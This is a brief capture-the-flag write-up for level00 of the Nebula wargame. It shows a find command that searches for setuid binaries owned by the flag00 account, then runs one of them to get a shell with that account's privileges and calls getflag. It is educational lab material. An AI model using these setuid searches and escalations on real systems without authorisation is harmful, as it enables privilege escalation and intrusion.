### Solution ###

According to the description, the program to find belongs to `flag00` and has the `setuid` bit set. By using these information and the command find, two programs are found.

```
level00@nebula:~$ find / -type f -perm -4000 -user flag00 -exec ls -l {} \; 2>/dev/null
-rwsr-x--- 1 flag00 level00 7358 Nov 20  2011 /bin/.../flag00
-rwsr-x--- 1 flag00 level00 7358 Nov 20  2011 /rofs/bin/.../flag00
```

These programs start a shell with the permissions of the account `flag00` which can be used to get the flag.

```
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
